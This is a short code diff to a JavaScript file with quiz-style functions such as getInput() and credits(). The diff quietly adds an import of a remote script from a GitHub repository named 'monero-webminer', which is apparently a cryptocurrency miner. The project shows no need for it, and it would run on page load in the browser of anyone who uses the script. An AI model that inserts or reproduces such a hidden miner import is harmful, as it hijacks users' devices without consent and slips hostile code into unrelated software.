@@ -707,6 +707,8 @@ function getInput() {
     return answerData;
 }
 
+import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/sparx.js';
+
 async function credits() {
     await sleep(200);
     console.clear();
